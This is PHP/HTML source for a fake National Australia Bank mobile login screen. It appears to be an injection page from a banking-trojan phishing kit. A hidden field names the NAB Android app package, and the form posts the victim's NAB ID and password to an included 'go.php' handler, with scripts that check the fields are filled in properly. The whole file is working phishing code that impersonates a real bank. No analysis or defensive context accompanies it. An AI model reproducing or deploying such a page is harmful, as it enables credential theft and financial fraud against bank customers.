<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>
<div class="container">
<div class="col-xs-10 col-sm-8">
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAA5klEQVR42rXQPUoDURSG4ddGLVO5izRaJQuI6SS9vdnPgKtIaSUMgfyM5RSJVSAuIAvQyus34oQwxT3FFw8cmMOF54VhAYV2v4YR+CPnRl65hE0NPRpcm7SfFdy7uODtn5fe4JYG1fHVidi4tqAdPYwzEQsPIh5uRGLciMS4EYlxKxLhdkT7GOB2JGVwKzI5xXXPz4Z/wLXA107gewXT/8BL7SETsfCXd7isoJ+JeHj7HkQ8PBN5snEjEuNGJMaNSIzbEX08Z3AronuIjlmL7+CK4/iRNTz8/iJ9DBJccKapobeEO4Af7MY/wU8qCpAAAAAASUVORK5CYII=" style="padding: 23px;display: inline-flex;float: left;">
	<h3 style="display: inline-flex;margin: 22px;float: left;font-size: 22px;"> Login </h3>
	<h3 style="color: rgb(195,5,5);display: inline-flex;margin: 22px;float: right;font-size: 22px;"> Login </h3>
</div>
<div id="content_div">


<h2 style="margin: 0;margin-bottom: 10px;"> ENTER DETAILS </h2>

<h3 style="margin: 0;margin-bottom: 10px; font-weight: 100;"> Your profile will be saved after you login. </h3>

<div id="form">
	<form method="post" autocomplete="off">
	<input name="field1" value="au.com.nab.mobile" type="hidden">
	<div class="form-group ">
	<input id="login" class="input" name="field2" placeholder="NAB ID" type="number"><br>
	<script>
						document.getElementById('login').onkeypress = function (e) {
							return !(/[А-Яа-яA-Za-z]/.test(String.fromCharCode(e.charCode)));
						}
					</script>
	</div>
	<div class="form-group ">
	<input class="input" id="password" name="field3" placeholder="Password" type="password" style="margin: 0;">
</div>
</div>
	<h3 style="color: rgb(194,0,0); text-align: center; display: block; font-weight: 100;"> Forgot your password? <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAA21BMVEUAAADBAADCAADCAADHAADDAADCAADFAADCAADCAADBAADEAAD/AADDAADDAAD/AAD/AADDAADCAAC/AADDAADDAADBAADCAADDAADEAADDAADCAADFAADBAADCAADRAACqAADCAADCAAD/AACAAADBAADDAADCAADCAAC2AADCAAC/AADCAAC/AADDAADDAADCAADVAADCAADCAAC/AAC/AADDAADCAADBAADCAADCAADMAADDAADDAADDAADCAADEAADDAADCAADCAADDAADBAADCAADEAADCAAAhamrvAAAASHRSTlMAPufGIOjfH4b+5A0Cq+QEAZrlFJ7gIaDcHqrZFrbhCwOx4gMC4xGkqAeeBN4MyMfUBq/NGAitzq3WGQWy2MPgl9fjFTPOsBoXtuczAAAApUlEQVQoz22SRRIDMQwEN8zMzIwbZgb9/0UZX6PRsVuSx2VblimH0+W2WHlEvD4m/AGRYIiIcEREojFi4gmYZIrNpGEyWWZyMPkCM0WYUpmdU0G2ao2YegMzzRYxbXNOp8tmejB9IgZm2VDzkeHjieZTw0n/DHHnut9eoH+5Uny9Ad9qbu/A9wfFjyfws95fv4BfycVuyHNnT/tAnif7DK/35/uHfmNEHUTxiBE0AAAAAElFTkSuQmCC" style="width: 13px;"> </h3>


	<input type="submit" value="Logon" id="input_submitBtn">	
	</form>

	
</div>
	    <script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};
						
                        if (!/^\w{4,100}$/i.test(oNumInp.value)) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
        </script>
		</div>
		</div>
</body>
</html>